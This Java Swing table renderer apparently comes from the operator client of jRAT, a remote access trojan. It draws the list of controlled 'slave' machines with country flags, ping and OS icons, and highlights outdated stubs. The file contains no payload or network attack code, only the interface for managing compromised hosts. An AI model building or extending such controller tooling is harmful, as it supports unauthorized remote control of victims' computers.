package se.jrat.client.ui.renderers.table;

import java.awt.Color;
import java.awt.Component;
import java.net.URL;

import javax.swing.JCheckBox;
import javax.swing.JLabel;
import javax.swing.JTable;
import javax.swing.table.DefaultTableCellRenderer;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Main;
import se.jrat.client.settings.Colors;
import se.jrat.client.ui.frames.Frame;
import se.jrat.client.utils.IconUtils;
import se.jrat.client.utils.Utils;
import se.jrat.common.Version;


@SuppressWarnings("serial")
public class MainTableRenderer extends DefaultTableCellRenderer {

	public MainTableRenderer() {
		setOpaque(true);
	}

	public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
		JLabel lbl = (JLabel) super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);

		AbstractSlave slave = Utils.getSlave(table.getValueAt(row, 3).toString());
		
		if (slave != null && !isSelected && slave.getVersion() != null && !slave.getVersion().equals(Version.getVersion()) && !slave.getVersion().equals("")) {
			setForeground(Colors.getGlobal().getColorFromIndex(Colors.getGlobal().get("outdated stubs").getIndex()));
		} else if (isSelected) {
			setForeground(Color.white);
		} else {
			setForeground(Color.black);
		}

		if (column == 4) {
			lbl.setIcon(IconUtils.getPingIcon(slave));
		} else if (column == 6) {
			lbl.setIcon(IconUtils.getOSIcon(slave));
		} else if (column == 0 && !Frame.thumbnails) {
			String path;

			String color = Integer.toHexString(lbl.getForeground().getRGB() & 0xffffff) + "";
			if (color.length() < 6) {
				color = "000000".substring(0, 6 - color.length()) + color;
			}
			
			String country = slave.getCountry();
						
			if (country != null) {
				path = "/flags/" + country.toLowerCase() + ".png";
			} else {
				path = "/flags/unknown.png";
			}
			
			JCheckBox b = new JCheckBox(value.toString(), slave.isSelected());

			b.setToolTipText(row + "");
			b.setBackground(lbl.getBackground());

			URL url = Main.class.getResource(path);

			if (url == null) {
				url = Main.class.getResource("/flags/unknown.png");
			}

			b.setText("<html><table cellpadding=0><tr><td><img src=\"" + url.toString() + "\"/></td><td width=3><td><font color=\"#" + color + "\">" + value + "</font></td></tr></table></html>");

			return b;
		} else {
			lbl.setIcon(null);
		}
		return lbl;
	}
}
